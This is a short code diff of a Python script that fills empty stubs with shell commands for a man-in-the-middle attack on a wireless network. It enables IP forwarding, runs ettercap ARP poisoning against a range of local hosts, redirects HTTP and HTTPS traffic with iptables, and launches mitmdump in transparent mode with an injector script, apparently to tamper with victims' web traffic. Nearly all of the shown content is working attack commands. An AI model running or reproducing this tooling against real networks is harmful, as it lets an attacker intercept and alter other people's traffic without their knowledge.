@@ -5,19 +5,21 @@ import requests
 import os
 import sys
 
-def start_mitm():
-    pass
+def ip_forward():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    return True
 
 def config_ettercap():
-    pass
+    os.system("ettercap -TqP autoadd -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150//")
+    return True
 
 def config_iptables():
     os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
     os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
     return True
     
-def get_cert(path, basename):
-    os.system("~/.local/bin/mitmdump --mode transparent -s controllers/injector2.py --certs *=cert.pem")
+def injector():
+    os.system("mitmdump --mode transparent -s injector2.py")
     return True
 
 def get_stats(secret_key, params={}):
